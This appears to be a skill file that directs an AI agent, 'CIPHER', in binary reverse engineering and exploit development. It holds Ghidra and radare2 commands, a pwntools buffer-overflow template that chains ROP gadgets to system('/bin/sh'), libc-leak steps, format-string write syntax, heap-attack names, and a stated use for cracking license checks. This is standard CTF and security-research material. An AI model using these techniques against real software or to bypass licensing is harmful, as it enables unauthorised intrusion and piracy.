---
name: binary-re
description: >
  Binary reverse engineering and exploit development skill for Harbinger's CIPHER agent.
  Covers static/dynamic analysis with Ghidra and radare2, binary exploitation with pwntools,
  format string bugs, buffer overflows, ROP chains, heap exploitation, and CTF-style challenges.
  Use when reversing binaries, analyzing malware behavior, developing exploits, finding memory
  corruption bugs, or cracking license checks. Triggers on: "reverse binary", "disassemble",
  "exploit development", "buffer overflow", "ROP chain", "heap exploit", "pwntools",
  "Ghidra", "radare2", "run cipher", "binary analysis", "CTF", "crack binary".
---

# Binary RE Skill

CIPHER agent skill — binary reverse engineering and memory corruption exploitation.

## Static Analysis

```bash
# Ghidra headless analysis
analyzeHeadless /tmp/ghidra_project ProjectName -import ./target_binary -postScript PrintASM.java

# radare2 quick recon
r2 -A ./binary           # auto-analyze
r2 -Aqc "afl" ./binary  # list all functions, quiet mode

# Common r2 commands
afl          # list functions
pdf @ main   # disassemble main
s sym.func   # seek to function
VV           # visual graph mode

# checksec — what mitigations are enabled?
checksec --file=./binary
python3 -c "from pwn import *; e = ELF('./binary'); print(e.checksec())"

# strings — quick intel
strings -a ./binary | grep -E "password|flag|key|secret|admin"

# ltrace/strace — dynamic library/syscall tracing
strace ./binary
ltrace ./binary
```

## Exploit Dev with pwntools

```python
from pwn import *

# Connect
p = process('./binary')         # local
p = remote('host', 1337)        # remote

# Buffer overflow — find offset
cyclic(200)                     # generate pattern
cyclic_find(0x61616161)         # find offset from crash

# Build payload
offset = 72
payload = flat(
    b'A' * offset,
    p64(ret_gadget),            # stack alignment (x64)
    p64(pop_rdi),               # ROP gadget
    p64(bin_sh_addr),
    p64(system_addr),
)

p.sendline(payload)
p.interactive()
```

## ROP Chain Building

```bash
# Find gadgets
ROPgadget --binary ./binary --rop
ropper -f ./binary --search "pop rdi"

# One-gadget (for libc)
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Leak libc base (ret2plt)
# 1. Call puts(got['puts']) to leak puts address
# 2. libc_base = leaked - libc.sym['puts']
# 3. system = libc_base + libc.sym['system']
```

## Format String Exploitation

```bash
# Detect: send %p.%p.%p — if you see addresses, it's vulnerable
# Leak stack: %7$p (7th argument on stack)
# Arbitrary write: %<value>c%<n>$hn (write 2 bytes to address at position n)
```

## Heap Exploitation (glibc malloc)

```bash
# Use pwndbg (GDB plugin)
gdb ./binary
heap         # show heap chunks
bins         # show free bins
vis_heap_chunks  # visual heap layout

# Common techniques
# tcache poisoning (glibc < 2.34)
# fastbin dup
# unsafe unlink
# house of force
```

## Key Tools

| Tool | Purpose |
|------|---------|
| Ghidra | Static analysis, decompilation |
| radare2 | Static/dynamic analysis, scripting |
| pwntools | Exploit scripting |
| pwndbg | Enhanced GDB for heap/ROP |
| ROPgadget | ROP chain construction |
| one_gadget | Magic gadget finder for libc |
| checksec | Binary mitigation audit |
| angr | Symbolic execution |

## References

- **Ghidra workflows**: See [references/ghidra.md](references/ghidra.md)
- **Common exploit patterns**: See [references/exploit-patterns.md](references/exploit-patterns.md)
